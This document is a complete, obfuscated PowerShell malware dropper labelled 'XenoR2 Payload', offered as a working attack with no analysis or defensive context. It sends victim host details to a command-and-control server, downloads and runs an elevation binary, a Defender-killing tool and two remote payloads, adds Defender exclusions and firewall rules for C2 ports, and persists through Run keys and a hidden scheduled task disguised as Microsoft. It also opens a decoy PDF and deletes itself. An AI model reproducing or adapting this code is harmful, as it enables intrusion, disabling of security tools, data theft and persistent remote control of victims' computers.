# XenoR2 Payload v16-obs — BITS Transfer (silent), firewall rules, defender kill
# Placed on signindat.com as stage-obs-v2.ps1
# 2 payloads: PatchPulsaar.exe → wmpp.exe + wdsr681f3e18.exe → wmov.exe

# === DIAGNOSTIC LOG ===
$log="$env:TEMP\wmisrv.log"
function log($m){ $ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; "$ts | $m" | Out-File $log -Append -Encoding utf8 }
log "=== PAYLOAD START (v16-obs) ==="

# === STRING OBFUSCATION ===
# Sources
$c1='htt';$c2='ps:/';$c3='/sign';$c4='indat';$c5='.com'
$srv=$c1+$c2+$c3+$c4+$c5
$c6='htt';$c7='ps://';$c8='raw.g';$c9='ithubu';$c10='sercon';$c11='tent.c';$c12='om/ji';$c13='mmyish';$c14='ere111';$c15='/WinD';$c16='ebloat';$c17='11/mai';$c18='n'
$gh=$c6+$c7+$c8+$c9+$c10+$c11+$c12+$c13+$c14+$c15+$c16+$c17+$c18
$sources=@($gh,$srv)

# Binary names (source on server)
$n1='Ele';$n2='vato';$n3='rShe';$n4='llCo';$n5='de.e';$n6='xe';$elev=$n1+$n2+$n3+$n4+$n5+$n6
$n7='win';$n8='def';$n9='ctl';$n10='.ex';$n11='e';$wdf=$n7+$n8+$n9+$n10+$n11
$n12='Pat';$n13='chPu';$n14='lsaa';$n15='r.ex';$n16='e';$ppx=$n12+$n13+$n14+$n15+$n16
$n17='wd';$n18='sr';$n19='68';$n20='1f';$n21='3e';$n22='18';$n23='.ex';$n24='e';$wdsrSrc=$n17+$n18+$n19+$n20+$n21+$n22+$n23+$n24
$n25='Rat';$n26='e_Co';$n27='nfir';$n28='mati';$n29='on_L';$n30='D-20';$n31='26-0';$n32='847.';$n33='pdf'
$pdf=$n25+$n26+$n27+$n28+$n29+$n30+$n31+$n32+$n33

# Final payload names on disk
$n34='wm';$n35='pp.';$n36='exe';$wmpp=$n34+$n35+$n36
$n37='wm';$n38='ov.';$n39='exe';$wmov=$n37+$n38+$n39

# Callback endpoint
$n40='cb.';$n41='php';$cbep=$n40+$n41

# Persistence
$n42='upd';$n43='atem';$n44='spul';$n45='sv2.';$n46='ps1';$persistScript=$n42+$n43+$n44+$n45+$n46
$n47='Win';$n48='dows';$n49='Secu';$n50='rity';$n51='Heal';$n52='th';$rkName=$n47+$n48+$n49+$n50+$n51+$n52
$n53='Win';$n54='dows';$n55='Upda';$n56='teOr';$n57='ches';$n58='trat';$n59='or';$rkNameAdmin=$n53+$n54+$n55+$n56+$n57+$n58+$n59
$n60='Win';$n61='dows';$n62='Heal';$n63='thMo';$n64='nito';$n65='r';$taskName=$n60+$n61+$n62+$n63+$n64+$n65

# Firewall strings
$n66='net';$n67='sh a';$n68='dvfi';$n69='rewa';$n70='ll';$fw=$n66+$n67+$n68+$n69+$n70
$n71='fire';$n72='wall';$n73=' add';$n74=' rul';$n75='e na';$n76='me=';$fwAdd=$n71+$n72+$n73+$n74+$n75+$n76
$n77=' dir';$n78='=in ';$n79='act';$n80='ion';$n81='=al';$n82='low ';$n83='pro';$n84='toc';$n85='ol=';$n86='TCP';$fwIn=$n77+$n78+$n79+$n80+$n81+$n82+$n83+$n84+$n85+$n86
$n87=' loc';$n88='alpo';$n89='rt=';$fwOut=$n77.Replace('in','out')+$n78.Replace('in','out')+$n79+$n80+$n81+$n82+$n83+$n84+$n85+$n86

$t=$env:TEMP
$ad="$env:APPDATA\Microsoft"
$ld="$env:LOCALAPPDATA\Microsoft"
$dl="$env:USERPROFILE\Downloads"
log "Strings assembled | srv=$srv | gh=$gh"

# === HOST INFO ===
$cbHost=$env:COMPUTERNAME
$cbUser=$env:USERNAME
$cbPid=$pid
$cbIsAdmin=$false
try{$cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}|Select-Object -First 1).IPAddress}catch{$cbIp='unknown'}
try{$cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption}catch{$cbOs='unknown'}

# === CALLBACK ===
function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/$cbep",'POST',$body)|Out-Null
    }catch{log "CB: $stage err: $($_.Exception.Message)"}
}

log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
_cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"

try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
log "S1: a=$cbIsAdmin"
_cb 'S1' 'ok' "is_admin=$cbIsAdmin"

# === BITS TRANSFER DOWNLOAD HELPER (dual-source, fully silent) ===
function _bitsDL($n,$dest,$label){
    foreach($src in $sources){
        $url="$src/$n"
        try{
            log "BITS: $label from $src"
            Start-BitsTransfer -Source $url -Destination $dest -Priority High -DisplayName $label -ErrorAction Stop | Out-Null
            if(Test-Path $dest){
                log "BITS: $label -> $dest ($((Get-Item $dest).Length) bytes)"
                return $true
            }
            log "BITS: $label file missing after transfer from $src"
        }catch{log "BITS: $label fail from $src : $_"}
    }
    log "BITS: $label fail all sources"
    return $false
}

# === STEP 1: DEFENDER EXCLUSIONS ===
log "Adding Defender exclusions"
try{
    $mp='Add-';$mp2='MpPr';$mp3='efer';$mp4='ence'
    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$t" -ErrorAction SilentlyContinue
    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ad" -ErrorAction SilentlyContinue
    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ld" -ErrorAction SilentlyContinue
    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$dl" -ErrorAction SilentlyContinue
    $exclProcs=@($wmpp,$wmov,'wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe',$wdf,'cmd.exe','wscript.exe','cscript.exe')
    foreach($xp in $exclProcs){try{& "$($mp+$mp2+$mp3+$mp4)" -ExclusionProcess $xp -ErrorAction SilentlyContinue}catch{}}
    log "Defender exclusions added"
}catch{log "FAILED Defender exclusions: $_ (non-fatal)"}

# === STEP 2: ELEVATION (ElevatorShellCode.exe) ===
if(-not $cbIsAdmin){
    $elevPath="$t\$elev"
    if(_bitsDL $elev $elevPath 'elev'){
        try{
            Start-Process $elevPath -WindowStyle Hidden | Out-Null
            log "S1: elev launched"
            _cb 'S1' 'ok' 'elev launched'
        }catch{log "S1: elev launch fail: $_"}
    }else{_cb 'S1' 'fail' 'elev dl'}
    Start-Sleep 15
    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
    log "S1: a=$cbIsAdmin"
    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail, continuing as user'}
}

# === STEP 3: DEFENDER KILL (windefctl.exe) — RIGHT AFTER ELEVATION ===
log "S2: windefctl exec (admin=$cbIsAdmin)"
$wdfPath="$t\$wdf"
if(_bitsDL $wdf $wdfPath 'defkill'){
    try{
        $proc=Start-Process $wdfPath -ArgumentList 'kill' -NoNewWindow -PassThru
        log "S2: defkill started pid=$($proc.Id), waiting 18s"
        Start-Sleep 18
        if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
        log "S2: defkill exit=$($proc.ExitCode)"
        _cb 'S2' 'ok' 'defkill done'
    }catch{
        log "S2: defkill launch fail: $_"
        _cb 'S2' 'fail' 'defkill launch err'
    }
}else{_cb 'S2' 'fail' 'defkill dl'}
Remove-Item $wdfPath -Force -ErrorAction SilentlyContinue | Out-Null

# === STEP 3.5: FIREWALL RULES (inbound + outbound for C2 ports) ===
if($cbIsAdmin){
    log "S2b: adding firewall rules"
    $ports=@('5173','4782')
    foreach($port in $ports){
        try{
            & $fw $fwAdd"`"C2-In-$port`" $fwIn $n87$n88$n89$port" 2>&1 | Out-Null
            log "S2b: inbound rule added for TCP $port"
        }catch{log "S2b: inbound $port fail: $_"}
        try{
            & $fw $fwAdd"`"C2-Out-$port`" $fwOut $n87$n88$n89$port" 2>&1 | Out-Null
            log "S2b: outbound rule added for TCP $port"
        }catch{log "S2b: outbound $port fail: $_"}
    }
    # Outbound allow for payload processes
    $fwProcs=@($wmpp,$wmov)
    foreach($fp in $fwProcs){
        try{
            & $fw $fwAdd"`"C2-Proc-$fp`" $fwOut.Replace($n86,'Any') $n87.Replace('local','')$n88.Replace('port','')$n89.Replace('rt=','program=')"$ad\$fp"" 2>&1 | Out-Null
            log "S2b: outbound rule added for $fp"
        }catch{log "S2b: outbound proc $fp fail: $_"}
    }
    _cb 'S2b' 'ok' 'fw rules added'
}else{_cb 'S2b' 'warn' 'no admin, skip fw'}

# === STEP 4: PERSISTENCE ===
$persistCmd="powershell -w hidden -NoP -c `"`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(`$env:TEMP\\u.ps1,`$w.DownloadData('$gh/$persistScript'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1`""
try{
    $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $rk -Name $rkName -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
    log "Persistence: HKCU Run added"
}catch{log "Persistence HKCU fail: $_"}

if($cbIsAdmin){
    try{
        $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $rk -Name $rkNameAdmin -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
        log "Persistence: HKLM Run added"
    }catch{log "Persistence HKLM fail: $_"}

    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    $xml=@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Author>Microsoft Corporation</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT2H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
<Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/$persistScript'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
</Task>
"@
    $xmlPath="$t\task.xml"
    [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
    schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
    log "Persistence: scheduled task created"
}
_cb 'S3' 'ok' 'persist ok'

# === STEP 5: PAYLOAD 1 — PatchPulsaar.exe → wmpp.exe ===
$wmppPath="$ad\$wmpp"
$wmppExists=(Test-Path $wmppPath)
log "S5: exists=$wmppExists at $wmppPath"

if(-not $wmppExists){
    $wmppFallback="$ld\$wmpp"
    if(Test-Path $wmppFallback){$wmppPath=$wmppFallback; $wmppExists=$true; log "S5: fallback found at $wmppPath"}
}

if($wmppExists){
    try{
        $p=Start-Process $wmppPath -WindowStyle Hidden -PassThru
        log "S5: re-launch PID=$($p.Id) from $wmppPath"
        _cb 'S5' 'ok' "re-launch PID=$($p.Id)"
    }catch{
        log "S5: re-launch fail: $_, will re-download"
        $wmppExists=$false
    }
}

if(-not $wmppExists){
    log "S5: downloading $ppx → $wmpp"
    $wmppTmp="$t\$wmpp"
    if(_bitsDL $ppx $wmppTmp 'payload1'){
        $copyTargets=@("$ad\$wmpp","$ld\$wmpp")
        foreach($ct in $copyTargets){
            try{
                $dir=Split-Path $ct -Parent
                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                Copy-Item $wmppTmp $ct -Force
                log "S5: copied to $ct"
            }catch{log "S5: copy fail $ct : $_"}
        }
        try{
            $launchPath="$ad\$wmpp"
            $p=Start-Process $launchPath -WindowStyle Hidden -PassThru
            log "S5: wmpp PID=$($p.Id) from AppData"
            _cb 'S5' 'ok' "PID=$($p.Id)"
        }catch{
            log "S5: launch fail: $_"
            _cb 'S5' 'fail' "launch err"
        }
    }else{
        log "S5: wmpp dl fail"
        _cb 'S5' 'fail' 'dl fail'
    }
}

# === STEP 6: PAYLOAD 2 — wdsr681f3e18.exe → wmov.exe (Overlord) ===
$wmovPath="$ad\$wmov"
$wmovExists=(Test-Path $wmovPath)
log "S6: exists=$wmovExists at $wmovPath"

if(-not $wmovExists){
    $wmovFallback="$ld\$wmov"
    if(Test-Path $wmovFallback){$wmovPath=$wmovFallback; $wmovExists=$true; log "S6: fallback found at $wmovPath"}
}

if($wmovExists){
    try{
        $wmovProc=Start-Process $wmovPath -WindowStyle Hidden -PassThru
        log "S6: re-launch PID=$($wmovProc.Id) from $wmovPath"
        _cb 'S6' 'ok' "re-launch PID=$($wmovProc.Id)"
    }catch{
        log "S6: re-launch fail: $_, will re-download"
        $wmovExists=$false
    }
}

if(-not $wmovExists){
    log "S6: downloading $wdsrSrc → $wmov"
    $wmovTmp="$t\$wmov"
    if(_bitsDL $wdsrSrc $wmovTmp 'payload2'){
        $wmovCopyTargets=@("$ad\$wmov","$ld\$wmov")
        foreach($ct in $wmovCopyTargets){
            try{
                $dir=Split-Path $ct -Parent
                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                Copy-Item $wmovTmp $ct -Force
                log "S6: copied to $ct"
            }catch{log "S6: copy fail $ct : $_"}
        }
        try{
            $wmovLaunch="$ad\$wmov"
            $wmovProc=Start-Process $wmovLaunch -WindowStyle Hidden -PassThru
            log "S6: wmov PID=$($wmovProc.Id) from AppData"
            _cb 'S6' 'ok' "PID=$($wmovProc.Id)"
        }catch{
            log "S6: launch fail: $_"
            _cb 'S6' 'fail' "launch err"
        }
    }else{
        log "S6: wmov dl fail"
        _cb 'S6' 'fail' 'dl fail'
    }
}

# === STEP 7: PDF DECOY ===
$markerPath="$ad\wmpp.seen"
if(-not (Test-Path $markerPath)){
    $pdfPath="$dl\$pdf"
    if(_bitsDL $pdf $pdfPath 'pdfdecoy'){
        try{
            Start-Process $pdfPath | Out-Null
            _cb 'S7' 'ok' 'pdf ok'
            Set-Content -Path $markerPath -Value ((Get-Date).ToString('o')) -NoNewline -Force
            log "S7: pdf opened, marker set"
        }catch{_cb 'S7' 'warn' 'pdf open fail'}
    }else{_cb 'S7' 'warn' 'pdf dl fail'}
}else{log "S7: skip (already shown)"}

# === STEP 8: CLEANUP + SELF-DELETE ===
$sl=[Random]::new().Next(5,10)
log "Waiting $sl sec before cleanup"
Start-Sleep $sl
Remove-Item "$t\$elev" -Force -ErrorAction SilentlyContinue
Remove-Item "$t\$wdf" -Force -ErrorAction SilentlyContinue
Remove-Item "$t\u.ps1" -Force -ErrorAction SilentlyContinue
log "Cleanup done"

Start-Sleep 2
$sp=$MyInvocation.MyCommand.Path
if($sp -and (Test-Path $sp)){
    log "Self-delete scheduled"
    $sb=@'
Start-Sleep 3
Remove-Item -Path "<PATH>" -Force -ErrorAction SilentlyContinue
'@
    $sb=$sb.Replace('<PATH>',$sp)
    Start-Process powershell.exe -ArgumentList "-ep bypass -w hidden -c `"$sb`"" -WindowStyle Hidden
}

log "=== PAYLOAD END ==="
_cb 'S9' 'ok' 'done'
